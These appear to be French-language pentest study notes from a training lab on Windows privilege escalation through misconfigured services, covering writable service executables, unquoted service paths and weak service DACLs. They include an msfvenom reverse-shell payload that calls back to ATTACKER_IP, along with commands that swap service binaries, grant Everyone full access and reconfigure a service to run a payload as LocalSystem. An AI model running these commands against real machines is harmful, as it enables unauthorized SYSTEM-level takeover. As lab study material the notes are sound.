> Abuser des mauvaises configurations du service

De manière générale, il est peu probable que les services Windows de base soient vulnérables à quoi que ce soit - les services installés par l'utilisateur sont beaucoup plus susceptibles d'avoir des trous.

Rechercher des services autres que ceux par défaut :

```sh
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

Vérifions les permissions sur le répertoire

```c
Get-Acl -Path 'C:\Program Files (x86)\System Explorer' | format-list
```

## Context
Chaque service sur une machine Windows aura un exécutable associé qui sera exécuté par le SCM chaque fois qu'un service est démarré.

Afficher la configuration d'un service

```c
sc qc <SERVICE_NAME>
```

Les paramètres les plus important ici sont le :
- `BINARY_PATH_NAME` (Le chemin d'executable du fichier) 
- `SERVICE_START_NAME` (le compte utilisé pour exécuter le service)

Pour vérifier les permissions du fichier ou dossiers sur l'exécutable, on utilise `icacls`:

```c
icacls C:\Windows\system32\svchost.exe
```

Les autorisations les plus importantes sont :

```sh
BUILTIN\User: (F => accès complet)
# Cela signifie que nous pouvons modifier le fichier et insérer la charge utile de notre choix.

Everyone: (M => modification)
# Cela signifie que nous pouvons écraser le fichier avec n'importe quelle charge utile de notre choix.

BUILTIN\Users:(AD) (WD)
# Permettant à l'utilisateur de créer respectivement des sous-répertoires et des fichiers.
```

Charge utile : 

```sh
msfvenom --platform windows -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o WService.exe
```

Dans un scénario normal, vous devrez probablement attendre le redémarrage du service,

```c
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>
```

# Insecure Permissions on Service Executable 
Autorisations non sécurisées sur l'exécutable du service

> [!NOTE] L'exécutable associé au service n'a pas d'argument 
> Exemple: `C:\Windows\system32\svchost.exe -k apphost`

Si l'exécutable associé à un service dispose de faibles autorisations permettant à un attaquant de le modifier ou de le remplacer, l'attaquant peut obtenir trivialement les privilèges du compte du service.

1. Afficher la configuration d'un service
2. Vérifier les autorisations sur l'exécutable avec `icacls`
3. Regarder les autorisations utile (M)
4. Génerer un payload et démarrons un écouteur

Une fois payload sur le serveur Windows, nous procédons au remplacement de l'exécutable du service par notre charge utile.

```c
cd C:\..\Service-path\

move service-name.exe service-name.exe.bkp

move c:\temp\payload.exe C:\...\Service-path\service-name.exe

icapls service-name.exe /grant Everyone:F
```

Ici la charge utile portera le meme nom que le SERVICE vulnerable

5. Redémarrer le service et obtenir un shell


# Unquoted Service Paths 
Chemins de service non cités

Lorsque nous ne pouvons pas écrire directement dans les exécutables du service comme dans [[#Insecure Permissions on Service Executable]], et que le service est configuré pour pointer vers un exécutable **«non cité `sans guillemets`»**

Nous entendons que le chemin de l'exécutable associé n'est pas correctement mis entre guillemets pour tenir compte des espaces sur le nom du dossier.

> Si on crée l'un des exécutables recherchés avant l'exécutable du service attendu, il peut forcer le service à exécuter un exécutable arbitraire.



> [!NOTE] Rappel
> La plupart des exécutables du service seront installés sous `C:\Program Files`ou `C:\Program Files (x86)`par défaut, ce qui n'est pas accessible en écriture aux utilisateurs non privilégiés. Cela empêche l’exploitation de tout service vulnérable.

1. Afficher la configuration d'un service
2. Vérifier les autorisations sur l'exécutable avec `icacls`
3. Regarder les autorisations utile (AD) et (WD)
4. Génerer un payload et démarrons un écouteur

Une fois la charge utile présente sur le serveur, déplacez-la vers l’un des emplacements où un piratage pourrait se produire.

Exemple de chemin vulnerable :

```c
C:\MyPrograms\Disk Sorter Entreprise\bin\dsksrs.exe
```

5. Placer le payload dans le chemin vulnerable

```c
move payload.exe C:\MyPrograms\Disk.exe 

icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

6. Redémarrer le service et obtenir un shell

# Insecure Service Permissions 
Autorisations de service non sécurisées

Si la DACL du service (et non la DACL exécutable du service ) vous permet de modifier la configuration d'un service, vous pourrez reconfigurer le service. Cela vous permettra de pointer vers n'importe quel exécutable dont vous avez besoin et de l'exécuter avec n'importe quel compte de votre choix, y compris **SYSTEM** lui-même.

1. Vérifier la DACL d'un service : 

```c
accesschk64.exe -qlc <SERVICE_NAME>
```

Verifiier si le groupe `BUILTIN\\USER` dispose de l'autorisation `SERVICE_ALL_ACCESS` 

2. Génerer un payload et démarrons un écouteur

Accorder les autorisations à tout le monde pour exécuter votre charge utile

```c
icacls C:\Temp\payload.exe /grant Everyone:F
```

Modifier l'exécutable et le compte associés au service : 

```c
sc config THMService binPath="C:\Temp\payload.exe" obj=LocalSystem
```

3. Redémarrer le service et obtenir un shell